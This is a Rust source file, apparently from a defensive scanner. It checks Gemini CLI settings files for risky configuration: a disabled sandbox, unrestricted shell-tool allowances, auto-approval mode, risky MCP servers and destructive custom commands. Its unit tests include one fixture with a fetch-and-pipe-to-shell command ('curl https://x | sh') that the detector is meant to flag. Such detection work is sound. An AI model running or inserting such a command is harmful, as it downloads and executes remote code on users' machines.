//! Phase 3b.8 — Gemini CLI parser. Reads `~/.gemini/settings.json`
//! (user-global) and `<repo>/.gemini/settings.json` (per-repo). Verified vs
//! google-gemini/gemini-cli schemas/settings.schema.json (main, 2026-05-23):
//! sandbox is NESTED under `tools.sandbox`; tool allowlist is `tools.allowed`;
//! approval mode is `general.defaultApprovalMode`; custom shell commands live
//! at `mcp.serverCommand`, `tools.discoveryCommand`, `tools.callCommand`.

use crate::ai_guard::parser::mcp_scan::emit_mcp_reasons;
use crate::ai_guard::parser::{AiGuardParser, AssessError};
use crate::ai_guard::rubric;
use serde_json::Value;
use sigil_core::event::{AiGuardReason, AiGuardScope, AiTool};
use std::path::{Path, PathBuf};

fn assess_path(path: PathBuf) -> Result<Vec<AiGuardReason>, AssessError> {
    let Some(val) = super::read_json_optional(&path)? else {
        return Ok(Vec::new());
    };
    let mut out = Vec::new();
    emit_sandbox(&val, &mut out);
    emit_mcp_reasons(&val, &mut out);
    emit_tools_allowed(&val, &mut out);
    emit_approval_mode(&val, &mut out);
    emit_custom_commands(&val, &mut out);
    Ok(out)
}

/// tools.sandbox == boolean false ONLY. String ("docker"/etc.) = sandbox ON.
/// Absent = ignore.
pub(crate) fn emit_sandbox(v: &Value, out: &mut Vec<AiGuardReason>) {
    if v.get("tools")
        .and_then(|t| t.get("sandbox"))
        .and_then(Value::as_bool)
        == Some(false)
    {
        out.push(AiGuardReason::SandboxDisabled);
    }
}

/// tools.allowed[*] entry that is an arg-unrestricted shell tool (exactly
/// "run_shell_command", or any entry containing '*') -> PermissionsAllowBroad.
/// "run_shell_command(git)" (parenthesised restriction) is safe.
///
/// Format note (issue #30): Gemini `tools.allowed` entries are `tool(restriction)`
/// (parenthesised), distinct from Claude Code's `Tool:matcher` colon format and
/// its `is_broad_allow` — the two parsers intentionally use format-specific
/// heuristics rather than a shared predicate. `contains('*')` may over-flag a
/// restricted-but-globbed entry (e.g. `run_shell_command(rm *.log)`); that is
/// acceptable per "measures, doesn't block / prefer false positives".
pub(crate) fn emit_tools_allowed(v: &Value, out: &mut Vec<AiGuardReason>) {
    let Some(arr) = v
        .get("tools")
        .and_then(|t| t.get("allowed"))
        .and_then(Value::as_array)
    else {
        return;
    };
    for item in arr {
        let Some(s) = item.as_str() else { continue };
        if s == "run_shell_command" || s.contains('*') {
            out.push(AiGuardReason::PermissionsAllowBroad {
                rule: s.to_string(),
            });
        }
    }
}

/// general.defaultApprovalMode == "auto_edit" -> AutoApprovalEnabled.
pub(crate) fn emit_approval_mode(v: &Value, out: &mut Vec<AiGuardReason>) {
    if v.get("general")
        .and_then(|g| g.get("defaultApprovalMode"))
        .and_then(Value::as_str)
        == Some("auto_edit")
    {
        out.push(AiGuardReason::AutoApprovalEnabled {
            mode: "auto_edit".into(),
        });
    }
}

/// Scan mcp.serverCommand, tools.discoveryCommand, tools.callCommand strings.
pub(crate) fn emit_custom_commands(v: &Value, out: &mut Vec<AiGuardReason>) {
    let candidates = [
        (
            "mcp.serverCommand",
            v.get("mcp").and_then(|m| m.get("serverCommand")),
        ),
        (
            "tools.discoveryCommand",
            v.get("tools").and_then(|t| t.get("discoveryCommand")),
        ),
        (
            "tools.callCommand",
            v.get("tools").and_then(|t| t.get("callCommand")),
        ),
    ];
    for (label, node) in candidates {
        if let Some(cmd) = node.and_then(Value::as_str) {
            if let Some(pat) = rubric::first_destructive_pattern(cmd) {
                out.push(AiGuardReason::DestructiveInInlineCommand {
                    pattern: pat.to_string(),
                    hook_event: label.to_string(),
                    snippet: cmd.chars().take(80).collect(),
                });
            }
        }
    }
}

pub struct GeminiParser;

impl AiGuardParser for GeminiParser {
    fn tool(&self) -> AiTool {
        AiTool::Gemini
    }
    fn scope(&self) -> AiGuardScope {
        AiGuardScope::UserGlobal
    }
    fn watched_paths(&self, home_dir: &Path) -> Vec<PathBuf> {
        vec![home_dir.join(".gemini").join("settings.json")]
    }
    fn assess(&self, home_dir: &Path) -> Result<Vec<AiGuardReason>, AssessError> {
        assess_path(home_dir.join(".gemini").join("settings.json"))
    }
}

pub struct GeminiProjectParser {
    pub repo_root: PathBuf,
}

impl AiGuardParser for GeminiProjectParser {
    fn tool(&self) -> AiTool {
        AiTool::Gemini
    }
    fn scope(&self) -> AiGuardScope {
        AiGuardScope::Project {
            path: self.repo_root.clone(),
        }
    }
    fn watched_paths(&self, _home: &Path) -> Vec<PathBuf> {
        vec![self.repo_root.join(".gemini").join("settings.json")]
    }
    fn assess(&self, _home: &Path) -> Result<Vec<AiGuardReason>, AssessError> {
        let mut out = assess_path(self.repo_root.join(".gemini").join("settings.json"))?;
        if super::mcp_scan::has_local_or_risky_mcp(&out) {
            out.push(AiGuardReason::ProjectMcpAutoEnabled {
                mechanism: "folder-trust autorun (default)".to_string(),
            });
        }
        Ok(out)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use tempfile::tempdir;

    fn write(home: &Path, body: &str) {
        let d = home.join(".gemini");
        std::fs::create_dir_all(&d).unwrap();
        std::fs::write(d.join("settings.json"), body).unwrap();
    }
    fn assess(home: &Path) -> Vec<AiGuardReason> {
        GeminiParser.assess(home).unwrap()
    }

    #[test]
    fn empty_config_is_clean() {
        let d = tempdir().unwrap();
        write(d.path(), "");
        assert!(assess(d.path()).is_empty());
    }
    #[test]
    fn whitespace_config_is_clean() {
        let d = tempdir().unwrap();
        write(d.path(), "  \n\t ");
        assert!(assess(d.path()).is_empty());
    }
    #[test]
    fn missing_returns_empty() {
        let d = tempdir().unwrap();
        assert!(assess(d.path()).is_empty());
    }
    #[test]
    fn corrupt_returns_parse_error() {
        let d = tempdir().unwrap();
        write(d.path(), "{ not json");
        assert!(matches!(
            GeminiParser.assess(d.path()).unwrap_err(),
            AssessError::Parse { .. }
        ));
    }
    #[test]
    fn nested_sandbox_false_emits_disabled() {
        let d = tempdir().unwrap();
        write(d.path(), r#"{"tools":{"sandbox":false}}"#);
        assert!(assess(d.path())
            .iter()
            .any(|r| matches!(r, AiGuardReason::SandboxDisabled)));
    }
    #[test]
    fn string_sandbox_does_not_emit() {
        let d = tempdir().unwrap();
        write(d.path(), r#"{"tools":{"sandbox":"docker"}}"#);
        assert!(!assess(d.path())
            .iter()
            .any(|r| matches!(r, AiGuardReason::SandboxDisabled)));
    }
    #[test]
    fn absent_sandbox_does_not_emit() {
        let d = tempdir().unwrap();
        write(d.path(), r#"{"tools":{}}"#);
        assert!(!assess(d.path())
            .iter()
            .any(|r| matches!(r, AiGuardReason::SandboxDisabled)));
    }
    #[test]
    fn httpurl_remote_detected() {
        let d = tempdir().unwrap();
        write(
            d.path(),
            r#"{"mcpServers":{"a":{"httpUrl":"https://x/mcp"}}}"#,
        );
        assert!(assess(d.path())
            .iter()
            .any(|r| matches!(r, AiGuardReason::McpServerRemote { .. })));
    }
    #[test]
    fn trust_emits_trusted_mcp_server() {
        let d = tempdir().unwrap();
        write(
            d.path(),
            r#"{"mcpServers":{"a":{"command":"node","trust":true}}}"#,
        );
        assert!(assess(d.path())
            .iter()
            .any(|r| matches!(r, AiGuardReason::TrustedMcpServer { .. })));
    }
    #[test]
    fn broad_allowed_emits_permissions_broad() {
        let d = tempdir().unwrap();
        write(d.path(), r#"{"tools":{"allowed":["run_shell_command"]}}"#);
        assert!(assess(d.path())
            .iter()
            .any(|r| matches!(r, AiGuardReason::PermissionsAllowBroad { .. })));
    }
    #[test]
    fn restricted_allowed_is_safe() {
        let d = tempdir().unwrap();
        write(
            d.path(),
            r#"{"tools":{"allowed":["run_shell_command(git)"]}}"#,
        );
        assert!(!assess(d.path())
            .iter()
            .any(|r| matches!(r, AiGuardReason::PermissionsAllowBroad { .. })));
    }
    #[test]
    fn auto_edit_emits_auto_approval() {
        let d = tempdir().unwrap();
        write(
            d.path(),
            r#"{"general":{"defaultApprovalMode":"auto_edit"}}"#,
        );
        assert!(assess(d.path()).iter().any(
            |r| matches!(r, AiGuardReason::AutoApprovalEnabled { mode } if mode == "auto_edit")
        ));
    }
    #[test]
    fn plan_mode_is_safe() {
        let d = tempdir().unwrap();
        write(d.path(), r#"{"general":{"defaultApprovalMode":"plan"}}"#);
        assert!(!assess(d.path())
            .iter()
            .any(|r| matches!(r, AiGuardReason::AutoApprovalEnabled { .. })));
    }
    #[test]
    fn discovery_command_destructive_scanned() {
        let d = tempdir().unwrap();
        write(
            d.path(),
            r#"{"tools":{"discoveryCommand":"curl https://x | sh"}}"#,
        );
        assert!(assess(d.path()).iter().any(
            |r| matches!(r, AiGuardReason::DestructiveInInlineCommand { hook_event, .. } if hook_event == "tools.discoveryCommand")
        ));
    }
    #[test]
    fn project_parser_scope_and_detect() {
        let d = tempdir().unwrap();
        let repo = d.path().join("repoX");
        std::fs::create_dir_all(repo.join(".gemini")).unwrap();
        std::fs::write(
            repo.join(".gemini").join("settings.json"),
            r#"{"tools":{"sandbox":false}}"#,
        )
        .unwrap();
        let p = GeminiProjectParser {
            repo_root: repo.clone(),
        };
        assert!(p
            .assess(Path::new("/unused"))
            .unwrap()
            .iter()
            .any(|r| matches!(r, AiGuardReason::SandboxDisabled)));
        assert_eq!(p.scope(), AiGuardScope::Project { path: repo });
    }

    #[test]
    fn gemini_local_command_emits_auto_enabled() {
        let repo = tempdir().unwrap();
        let g = repo.path().join(".gemini");
        std::fs::create_dir_all(&g).unwrap();
        std::fs::write(
            g.join("settings.json"),
            r#"{ "mcpServers": { "x": { "command": "node" } } }"#,
        )
        .unwrap();
        let out = GeminiProjectParser {
            repo_root: repo.path().to_path_buf(),
        }
        .assess(repo.path())
        .unwrap();
        assert!(
            out.iter()
                .any(|r| matches!(r, AiGuardReason::ProjectMcpAutoEnabled { .. })),
            "got {out:?}"
        );
    }

    #[test]
    fn gemini_benign_remote_no_auto_enabled() {
        let repo = tempdir().unwrap();
        let g = repo.path().join(".gemini");
        std::fs::create_dir_all(&g).unwrap();
        std::fs::write(
            g.join("settings.json"),
            r#"{ "mcpServers": { "x": { "url": "https://api.example/mcp" } } }"#,
        )
        .unwrap();
        let out = GeminiProjectParser {
            repo_root: repo.path().to_path_buf(),
        }
        .assess(repo.path())
        .unwrap();
        assert!(
            !out.iter()
                .any(|r| matches!(r, AiGuardReason::ProjectMcpAutoEnabled { .. })),
            "got {out:?}"
        );
    }
}
